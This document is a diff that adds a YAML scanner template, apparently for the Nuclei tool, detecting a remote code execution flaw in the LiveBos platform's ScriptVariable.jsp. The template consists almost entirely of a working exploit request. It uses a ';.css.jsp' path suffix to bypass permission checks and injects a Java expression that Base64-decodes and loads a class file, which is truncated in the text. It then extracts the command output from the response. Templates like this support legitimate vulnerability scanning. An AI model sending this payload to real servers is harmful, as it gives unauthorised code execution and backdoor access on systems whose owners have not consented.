@@ -1,0 +1,35 @@
+id: livebos-rce
+info:
+  name: LiveBos ScriptVariable.jsp Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    LiveBos smart business architecture platform has a remote code execution vulnerability. Attackers can exploit this to execute arbitrary code, write backdoors, and gain control over the web server.
+  tags: rce, permission-bypass
+  reference:
+    - https://www.apexsoft.com.cn/ApexsoftSearch.jsp?s_content=bpm
+
+http:
+  - raw:
+      - |
+        POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        act=put&scope=0&name=gName13&value=java.lang.Class.forName("org.apache.commons.codec.binary.Base64").newInstance().decode("yv66vgAAADEA5AoATg...")
+    extractors:
+      - type: regex
+        name: execution_output
+        group: 1
+        regex:
+          - "(?s)<value>(.*?)</value>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        words:
+          - "<value>"
+          - "</value>"
